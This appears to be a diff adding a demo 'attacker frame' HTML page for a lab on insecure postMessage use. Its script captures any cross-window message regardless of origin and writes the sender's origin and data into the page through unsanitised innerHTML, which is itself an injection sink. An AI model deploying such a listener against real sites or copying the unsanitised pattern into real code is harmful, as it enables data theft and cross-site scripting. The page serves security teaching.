@@ -1,0 +1,20 @@
+<!DOCTYPE html><html lang="en">
+<head><meta charset="UTF-8">
+<style>
+  body{background:#0a0004;color:#ff9090;font-family:'JetBrains Mono',monospace;font-size:.78rem;padding:12px;margin:0;}
+  h4{color:#ff3366;margin-bottom:8px;font-size:.72rem;letter-spacing:.1em;}
+  pre{background:#12000a;border:1px solid rgba(255,51,102,.3);padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;}
+  .captured{color:#ff6eb4;font-weight:700;}
+</style></head>
+<body>
+<h4>👁 ATTACKER FRAME — DATA CAPTURE</h4>
+<pre id="log">Waiting to capture postMessage data…</pre>
+<script>
+// Attacker captures any postMessage sent without origin restriction
+window.addEventListener('message', function(e) {
+  var log = document.getElementById('log');
+  log.innerHTML = '<span class="captured">CAPTURED from: ' + e.origin + '</span>\n\n' +
+    JSON.stringify(e.data, null, 2);
+});
+</script>
+</body></html>
